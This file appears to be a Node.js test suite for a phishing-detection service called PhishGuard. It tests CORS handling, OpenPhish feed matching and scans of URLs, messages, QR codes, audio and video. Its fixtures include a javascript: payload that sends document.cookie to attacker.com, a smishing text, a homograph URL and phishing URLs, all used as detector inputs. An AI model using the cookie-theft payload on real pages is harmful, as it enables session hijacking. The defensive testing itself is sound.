/**
 * PhishGuard Web - Zero-Dependency Verification Test Suite
 * Tests the backend HTTP API, CORS headers, OpenPhish Anti-Evasion,
 * and the strict Tri-State contract.
 */

const http = require('http');
const path = require('path');
const { spawn } = require('child_process');

const TEST_PORT = 8788;
const TEST_HOST = '127.0.0.1';

let serverProcess = null;

function runRequest(options, data) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let body = '';
      res.setEncoding('utf8');
      res.on('data', chunk => { body += chunk; });
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: body ? JSON.parse(body) : null,
          rawBody: body
        });
      });
    });

    req.on('error', reject);
    if (data) {
      req.write(typeof data === 'string' ? data : JSON.stringify(data));
    }
    req.end();
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let passedTests = 0;
let totalTests = 0;

function assert(condition, message) {
  totalTests++;
  if (!condition) {
    console.error(`  ❌ FAIL: ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  passedTests++;
  console.log(`  ✅ PASS: ${message}`);
}

async function startTestServer() {
  console.log('[Test Setup] Launching backend server.js on port ' + TEST_PORT + '...');
  serverProcess = spawn(process.execPath, [path.join(__dirname, 'server.js')], {
    env: {
      ...process.env,
      HOST: TEST_HOST,
      PORT: String(TEST_PORT),
      VIRUSTOTAL_API_KEY: '' // Test without key first for tri-state verification
    },
    stdio: 'pipe'
  });

  serverProcess.stdout.on('data', d => {
    // console.log(`[Server stdout] ${d}`);
  });
  serverProcess.stderr.on('data', d => {
    console.error(`[Server stderr] ${d}`);
  });

  // Wait for server to be responsive
  for (let i = 0; i < 30; i++) {
    await sleep(200);
    try {
      const res = await runRequest({
        host: TEST_HOST,
        port: TEST_PORT,
        path: '/api/health',
        method: 'GET'
      });
      if (res.statusCode === 200) {
        console.log('[Test Setup] Server is online and ready.');
        return;
      }
    } catch {
      // wait more
    }
  }
  throw new Error('Server failed to start within timeout');
}

async function testCorsPreflight() {
  console.log('\n--- 1. Testing Strict CORS Preflight OPTIONS Handling ---');
  
  const origin = 'chrome-extension://abcdefghijklmnopabcdefghijklmnop';
  const res = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'OPTIONS',
    headers: {
      'Origin': origin,
      'Access-Control-Request-Method': 'POST',
      'Access-Control-Request-Headers': 'Content-Type'
    }
  });

  assert(res.statusCode === 204, 'Preflight OPTIONS returns HTTP 204 No Content');
  assert(res.headers['access-control-allow-origin'] === origin, `Reflects Chrome Extension Origin: ${origin}`);
  assert(res.headers['access-control-allow-methods'].includes('POST'), 'Allows POST method in preflight');
  assert(res.headers['access-control-allow-headers'].includes('Content-Type'), 'Allows Content-Type header in preflight');
}

async function testHealthEndpoint() {
  console.log('\n--- 2. Testing /api/health Endpoint & Feed Indexing ---');
  
  const res = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/health',
    method: 'GET'
  });

  assert(res.statusCode === 200, 'Health endpoint returns HTTP 200');
  assert(res.body.status === 'online', 'Service status is online');
  assert(typeof res.body.openPhish === 'object', 'OpenPhish metadata object present');
  console.log(`     Feed stats: ${res.body.openPhish.exactEntries} exact entries, ${res.body.openPhish.strippedEntries} stripped entries`);
}

async function testOpenPhishExactMatch() {
  console.log('\n--- 3. Testing OpenPhish Exact Feed Match ---');
  
  const fs = require('fs');
  const feedLines = fs.readFileSync(path.join(__dirname, 'openphish_fallback.txt'), 'utf8')
    .split(/\r?\n/)
    .map(l => l.trim())
    .filter(l => l && !l.startsWith('#'));
  const targetPhishUrl = feedLines[0] || 'https://www.trzorsutelgin.godaddysites.com/';
  
  const res = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Origin': 'chrome-extension://test'
    }
  }, [targetPhishUrl]);

  assert(res.statusCode === 200, 'Analyze endpoint returns HTTP 200');
  assert(Array.isArray(res.body) && res.body.length === 1, 'Response is an array of length 1');
  
  const item = res.body[0];
  assert(item.status === 'malicious', 'Status is marked malicious');
  assert(item.riskScore === 100, 'riskScore is 100');
  assert(item.evidence.length > 0, 'Evidence array contains detection entry');
  assert(item.evidence[0].includes('Exact match found for feed entry'), 'Evidence quotes the exact feed entry match');
}

async function testOpenPhishAntiEvasionStrippedMatch() {
  console.log('\n--- 4. Testing OpenPhish Anti-Evasion Query-Stripped Match ---');
  
  const fs = require('fs');
  const feedLines = fs.readFileSync(path.join(__dirname, 'openphish_fallback.txt'), 'utf8')
    .split(/\r?\n/)
    .map(l => l.trim())
    .filter(l => l && !l.startsWith('#'));
  const baseFeedUrl = feedLines[1] || feedLines[0];
  const strippedBase = baseFeedUrl.split('?')[0].split('#')[0];
  const evadedUrl = `${strippedBase}?evade_bot=1&random_hash=987abc&victim=admin`;
  
  const res = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Origin': 'chrome-extension://test'
    }
  }, [evadedUrl]);

  assert(res.statusCode === 200, 'Analyze endpoint returns HTTP 200');
  const item = res.body[0];
  assert(item.status === 'malicious', 'Anti-Evasion successfully flags URL as malicious');
  assert(item.riskScore === 100, 'riskScore is 100');
  assert(item.evidence.some(e => e.includes('OpenPhish Anti-Evasion Match')), 'Evidence specifically cites Anti-Evasion match');
}

async function testTriStateContractWithoutApiKey() {
  console.log('\n--- 5. Testing Strict Tri-State Contract (Enabled Sources Only) ---');
  
  const cleanUrl = 'https://www.wikipedia.org/wiki/Computer_security';
  
  // Test clean URL: evaluated by enabled source (OpenPhish) and not flagged -> safe
  const resClean = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Origin': 'chrome-extension://test'
    }
  }, [{ id: 42, title: 'Wikipedia - Computer Security', url: cleanUrl }]);

  assert(resClean.statusCode === 200, 'Analyze endpoint returns HTTP 200');
  const cleanItem = resClean.body[0];
  assert(cleanItem.id === 42, 'Passed-through tab ID preserved');
  assert(cleanItem.title === 'Wikipedia - Computer Security', 'Passed-through tab title preserved');
  assert(cleanItem.url === cleanUrl, 'URL preserved');
  assert(cleanItem.status === 'safe', 'Clean URL is marked "safe" when verified against active OpenPhish feed');
  assert(cleanItem.riskScore === 0, 'riskScore is 0 for safe status');
  assert(cleanItem.unverifiedBy.length === 0, 'unverifiedBy is empty for clean URL');
  assert(cleanItem.notes.some(n => n.includes('VirusTotal: Disabled (no API key configured)')), 'Notes record VirusTotal disabled state');

  // Test invalid protocol URL: non-HTTP -> unverified / unknown
  const resInvalid = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Origin': 'chrome-extension://test'
    }
  }, [{ id: 99, title: 'Internal Settings', url: 'chrome://settings' }]);

  const invalidItem = resInvalid.body[0];
  assert(invalidItem.status === 'unknown', 'Invalid non-HTTP URL is marked unknown');
  assert(invalidItem.unverifiedBy.includes('ProtocolValidator'), 'unverifiedBy contains ProtocolValidator');
}

async function testTriStateContractWithApiKey() {
  console.log('\n--- 6. Testing VirusTotal Integration When API Key Provided ---');
  
  // When an API key is provided and upstream cannot verify (e.g., invalid key or 404),
  // VirusTotal becomes an enabled source and is marked as unverified.
  const unknownUrl = 'https://example-unanalyzed-site-test.org/path?token=123';
  
  const res = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Origin': 'chrome-extension://test',
      'x-apikey': 'test_dummy_api_key_1234567890'
    }
  }, [{ id: 77, title: 'Test Unanalyzed', url: unknownUrl }]);

  assert(res.statusCode === 200, 'Analyze endpoint returns HTTP 200 with API key');
  const item = res.body[0];
  assert(item.id === 77, 'Passed-through tab ID preserved');
  assert(item.status === 'unknown', 'URL is marked unknown when enabled VirusTotal source fails verification');
  assert(item.unverifiedBy.includes('VirusTotal'), 'unverifiedBy explicitly lists VirusTotal');
  assert(item.notes.some(n => n.includes('VirusTotal:')), 'Notes provide upstream VirusTotal context');
}

async function testBatchArrayPreservation() {
  console.log('\n--- 7. Testing Batch Request Length & Order Preservation ---');

  const fs = require('fs');
  const feedLines = fs.readFileSync(path.join(__dirname, 'openphish_fallback.txt'), 'utf8')
    .split(/\r?\n/)
    .map(l => l.trim())
    .filter(l => l && !l.startsWith('#'));
  const exactUrl = feedLines[0];
  const evadedUrl = `${feedLines[1].split('?')[0].split('#')[0]}?token=evade123&victim=alice`;

  const batch = [
    { id: 1, title: 'Live Phish Exact', url: exactUrl },
    { id: 2, title: 'Live Phish Evaded', url: evadedUrl },
    { id: 3, title: 'Clean Wiki', url: 'https://en.wikipedia.org/wiki/Main_Page' },
    { id: 4, title: 'Invalid URL', url: 'chrome://settings' }
  ];

  const res = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Origin': 'chrome-extension://test'
    }
  }, batch);

  assert(res.statusCode === 200, 'HTTP 200 for batch');
  assert(res.body.length === batch.length, `Batch length strictly preserved (${res.body.length} items)`);
  assert(res.body[0].id === 1 && res.body[0].status === 'malicious', 'Item 0 (Phish Exact) is malicious');
  assert(res.body[1].id === 2 && res.body[1].status === 'malicious', 'Item 1 (Phish Evaded with parameters) is malicious');
  assert(res.body[2].id === 3 && res.body[2].status === 'safe', 'Item 2 (Wiki Clean) is recognized as safe');
  assert(res.body[3].id === 4 && res.body[3].status === 'unknown', 'Item 3 (chrome://) is unknown');
}

async function testThreatLevelsAndContentSignals() {
  console.log('\n--- 8. Testing 3-Tier Threat Levels & On-Screen Content Inspection ---');

  const payload = [
    // 1. Safe Tab: Score 0 (Green)
    {
      id: 101,
      title: 'Safe Documentation Page',
      url: 'https://developer.mozilla.org/en-US/docs/Web',
      contentSignals: {
        contentThreatScore: 0,
        findings: []
      }
    },
    // 2. Warning Tab: Score 1-50 (Yellow)
    {
      id: 102,
      title: 'Suspicious Page with Deceptive Links',
      url: 'https://news-portal-example.com/article/1',
      contentSignals: {
        contentThreatScore: 35,
        findings: [
          'Deceptive Link Spoofing: Display text claims "paypal.com" but href routes to "attacker-link.com"'
        ]
      }
    },
    // 3. Danger Tab: Score 50-100 (Red)
    {
      id: 103,
      title: 'Phishing Form Harvesting Credentials',
      url: 'https://unsecure-banking-login.com/login',
      contentSignals: {
        contentThreatScore: 85,
        findings: [
          'Insecure Credential Input: Password field detected over unencrypted HTTP',
          'Social Engineering Pattern: Urgent coercive phrase detected ("confirm your identity immediately")'
        ]
      }
    },
    // 4. Deceptive Clickbait / Fake Download Ad Tab: Score 60-90 (Red / Danger)
    {
      id: 104,
      title: 'AnimePahe Mirror with Fake Download Banner',
      url: 'https://animepahe.ng/play',
      contentSignals: {
        contentThreatScore: 90,
        findings: [
          'Deceptive Clickbait / Fake Download Ad: High-visibility "START DOWNLOAD" button detected routing to external/advertising destination (track.adnetwork.com)',
          'Mirror Domain Notice: Page displays "Beware of fake websites" disclaimer, common indicator of unauthorized clone/piracy streaming mirrors'
        ]
      }
    },
    // 5. KYC / ID Document Harvesting on Affiliate Marketing Subdomain: Score 50-100 (Red / Danger)
    {
      id: 105,
      title: 'SPORTS WELCOME BONUS - Dafabet Promo',
      url: 'https://cmkt.dafapromo.com/crsl/reg/in/?btag=689052&clickid=wc8nva0bfb1v',
      contentSignals: {
        contentThreatScore: 65,
        findings: [
          'Unauthorized Identity Solicitation: Page requests government ID / document upload alongside sensitive credentials on an affiliate/marketing subdomain (cmkt.dafapromo.com)'
        ]
      }
    }
  ];

  const res = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/analyze',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Origin': 'chrome-extension://test'
    }
  }, payload);

  assert(res.statusCode === 200, 'HTTP 200 for content inspection batch');
  assert(res.body.length === 5, 'Received 5 analyzed items');

  // Item 1: Level 0 (Safe / Green)
  const safeItem = res.body[0];
  assert(safeItem.threatLevel === 'safe', 'Item 1 classified as threatLevel: "safe"');
  assert(safeItem.riskScore === 0, 'Item 1 riskScore is 0 (Level 0)');
  assert(safeItem.status === 'safe', 'Item 1 status is safe');

  // Item 2: Level 1-50 (Warning / Yellow)
  const warnItem = res.body[1];
  assert(warnItem.threatLevel === 'warning', 'Item 2 classified as threatLevel: "warning"');
  assert(warnItem.riskScore === 35, 'Item 2 riskScore is 35 (Level 1-50 Yellow)');
  assert(warnItem.status === 'warning', 'Item 2 status is warning');
  assert(warnItem.contentFindings.length === 1, 'Item 2 has 1 content finding recorded');
  assert(warnItem.evidence.some(e => e.includes('Deceptive Link Spoofing')), 'Item 2 evidence includes deceptive link finding');

  // Item 3: Level 50-100 (Danger / Red)
  const dangerItem = res.body[2];
  assert(dangerItem.threatLevel === 'danger', 'Item 3 classified as threatLevel: "danger"');
  assert(dangerItem.riskScore === 85, 'Item 3 riskScore is 85 (Level 50-100 Red)');
  assert(dangerItem.status === 'malicious', 'Item 3 status is malicious (Danger tier)');
  assert(dangerItem.contentFindings.length === 2, 'Item 3 has 2 content findings recorded');
  assert(dangerItem.evidence.some(e => e.includes('Password field detected')), 'Item 3 evidence cites password field vulnerability');

  // Item 4: Deceptive Clickbait Ad (Level 50-100 Danger / Red)
  const clickbaitItem = res.body[3];
  assert(clickbaitItem.threatLevel === 'danger', 'Item 4 classified as threatLevel: "danger"');
  assert(clickbaitItem.riskScore === 90, 'Item 4 riskScore is 90 (Level 50-100 Red)');
  assert(clickbaitItem.status === 'malicious', 'Item 4 status is malicious');
  assert(clickbaitItem.evidence.some(e => e.includes('START DOWNLOAD')), 'Item 4 evidence cites deceptive START DOWNLOAD button');
  assert(clickbaitItem.evidence.some(e => e.includes('Beware of fake websites')), 'Item 4 evidence cites mirror warning notice');

  // Item 5: KYC / ID Document Harvesting on Affiliate Subdomain (Level 50-100 Danger / Red)
  const kycItem = res.body[4];
  assert(kycItem.threatLevel === 'danger', 'Item 5 classified as threatLevel: "danger"');
  assert(kycItem.riskScore === 65, 'Item 5 riskScore is 65');
  assert(kycItem.status === 'malicious', 'Item 5 status is malicious');
  assert(kycItem.evidence.some(e => e.includes('Unauthorized Identity Solicitation')), 'Item 5 evidence cites unauthorized identity solicitation');
}

async function testSpecializedScanEndpoints() {
  console.log('\n--- 9. Testing Specialized Checkers (URL, Message, QR, Audio, Video) ---');

  // 1. URL Scan: Homograph Attack Detection
  const resUrl = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/url',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, { url: 'https://xn--pple-43d.com/verify-account/login' });

  assert(resUrl.statusCode === 200, 'POST /api/scan/url returns HTTP 200');
  assert(resUrl.body.threatLevel === 'danger', 'Homograph punycode URL categorized as Danger');
  assert(resUrl.body.riskScore >= 50, 'Homograph riskScore is >= 50');
  assert(resUrl.body.homograph.isHomograph === true, 'Punycode homograph detected');
  assert(resUrl.body.evidence.some(e => e.includes('Punycode')), 'Evidence mentions Punycode spoofing');

  // 2. Message / Smishing Scan: Coercive Credential Phishing
  const resMsg = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/message',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, {
    text: 'URGENT SECURITY ALERT from IRS: Your account suspended within 24 hours. Enter your 2FA verification code and recovery seed phrase immediately to avoid legal action.'
  });

  assert(resMsg.statusCode === 200, 'POST /api/scan/message returns HTTP 200');
  assert(resMsg.body.threatLevel === 'danger', 'Coercive credential harvesting message categorized as Danger');
  assert(resMsg.body.riskScore >= 70, 'Smishing riskScore >= 70');
  assert(resMsg.body.evidence.some(e => e.includes('Credential Harvesting')), 'Evidence identifies credential harvesting');
  assert(resMsg.body.evidence.some(e => e.includes('Coercive Psychological Pressure')), 'Evidence identifies urgency coercive pressure');

  // 3. QR Code Quishing Scan: Dangerous Executable URI
  const resQr = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/qr',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, { payload: 'javascript:document.location="http://attacker.com/?cookie="+document.cookie' });

  assert(resQr.statusCode === 200, 'POST /api/scan/qr returns HTTP 200');
  assert(resQr.body.threatLevel === 'danger', 'Dangerous javascript: QR payload categorized as Danger');
  assert(resQr.body.riskScore === 100, 'Javascript URI QR payload riskScore is 100');
  assert(resQr.body.evidence.some(e => e.includes('Dangerous URI Scheme')), 'Evidence quotes dangerous URI scheme');

  // 4. Audio Voice Vishing Scan: Synthetic Acoustic Features
  const resAudio = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/audio',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, {
    metadata: { encoder: 'Lavf58.29.100 (TTS-Engine)' },
    spectralStats: { highFreqCutoff: 8000, pitchVariance: 6.2, unnaturalZeroCrossing: true },
    transcript: 'Your bank account has an unauthorized wire transfer. Press 1 to speak with fraud support.'
  });

  assert(resAudio.statusCode === 200, 'POST /api/scan/audio returns HTTP 200');
  assert(resAudio.body.threatLevel === 'danger', 'Synthetic voice + vishing transcript categorized as Danger');
  assert(resAudio.body.riskScore >= 60, 'Audio threat score >= 60');
  assert(resAudio.body.evidence.some(e => e.includes('Acoustic Frequency Anomaly')), 'Identifies high frequency cutoff anomaly');
  assert(resAudio.body.evidence.some(e => e.includes('Robotic Prosody')), 'Identifies robotic pitch variance anomaly');

  // 5. Video Deepfake Scan: Boundary Jitter & Video Phishing
  const resVideo = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/video',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, {
    metadata: { encoder: 'FFmpeg-synthetic-face' },
    frameMetrics: { facialBoundaryJitter: 78, unnaturalBlinkRate: true, frameRateAnomalies: true },
    hasQrInFrame: true,
    qrPayload: 'https://bit.ly/verify-kyc-identity'
  });

  assert(resVideo.statusCode === 200, 'POST /api/scan/video returns HTTP 200');
  assert(resVideo.body.threatLevel === 'danger', 'Deepfake video with embedded quishing QR categorized as Danger');
  assert(resVideo.body.riskScore >= 70, 'Video threat score >= 70');
  assert(resVideo.body.evidence.some(e => e.includes('Facial Warping Anomaly')), 'Identifies facial boundary jitter');
  assert(resVideo.body.evidence.some(e => e.includes('Video Stream Quishing')), 'Identifies video stream quishing');

  // 6. Automated Batch URL Scan (Discovered links & tabs)
  const resBatchUrls = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/urls',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, {
    urls: [
      'https://xn--pple-43d.com/login',
      'https://en.wikipedia.org/wiki/Computer_security',
      'https://bit.ly/suspicious-shortlink'
    ]
  });

  assert(resBatchUrls.statusCode === 200, 'POST /api/scan/urls returns HTTP 200 for batch');
  assert(Array.isArray(resBatchUrls.body), 'Batch URL scan returns array of verdicts');
  assert(resBatchUrls.body.length === 3, 'Batch URL scan returns exact 3 items');
  assert(resBatchUrls.body[0].threatLevel === 'danger', 'First batch URL correctly identified as Danger (homograph)');
  assert(resBatchUrls.body[1].threatLevel === 'safe', 'Second batch URL correctly identified as Safe (wiki)');

  // 7. Clickbait / Fake Download URL Scan
  const resClickbait = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/url',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, { url: 'https://fast-files.org/start-download-now/package.exe' });

  assert(resClickbait.statusCode === 200, 'POST /api/scan/url returns HTTP 200 for clickbait');
  assert(resClickbait.body.threatLevel === 'warning' || resClickbait.body.threatLevel === 'danger', 'Clickbait lure flagged');
  assert(resClickbait.body.evidence.some(e => e.includes('Deceptive Clickbait Pattern')), 'Identifies clickbait download marker');

  // 8. Ephemeral Malvertising Redirector & Tracker URL Scan (rollssagesamorence -> uuidksinc)
  const resTracker = await runRequest({
    host: TEST_HOST,
    port: TEST_PORT,
    path: '/api/scan/url',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Origin': 'chrome-extension://test' }
  }, { url: 'https://rollssagesamorence.com/780bac9a-bdce-43f1-9fe5-65d0b776679b?externalid=1790270518100000IN67825915bdaac35b&destination=https%3A%2F%2Fr.uuidksinc.net%2Fmatchx' });

  assert(resTracker.statusCode === 200, 'POST /api/scan/url returns HTTP 200 for malvertising tracker');
  assert(resTracker.body.threatLevel === 'warning' || resTracker.body.threatLevel === 'danger', 'Malvertising tracker URL flagged');
  assert(resTracker.body.riskScore >= 45, 'Tracker URL riskScore >= 45');
  assert(resTracker.body.evidence.some(e => e.includes('Malvertising Tracker Gateway') || e.includes('Ephemeral Ad-Redirect Parameter')), 'Identifies ephemeral ad tracker or redirect parameter');
  assert(resTracker.body.notes.some(n => n.includes('Zero-Hour Behavioral Insight')), 'Notes explain zero-hour multi-vendor detection difference');
}

async function main() {
  try {
    await startTestServer();
    await testCorsPreflight();
    await testHealthEndpoint();
    await testOpenPhishExactMatch();
    await testOpenPhishAntiEvasionStrippedMatch();
    await testTriStateContractWithoutApiKey();
    await testTriStateContractWithApiKey();
    await testBatchArrayPreservation();
    await testThreatLevelsAndContentSignals();
    await testSpecializedScanEndpoints();

    console.log(`\n========================================`);
    console.log(`🎉 ALL ${passedTests}/${totalTests} TESTS PASSED PERFECTLY!`);
    console.log(`========================================\n`);
  } catch (err) {
    console.error('\n💥 Test suite encountered an error:', err.message);
    process.exitCode = 1;
  } finally {
    if (serverProcess) {
      serverProcess.kill();
    }
  }
}

main();
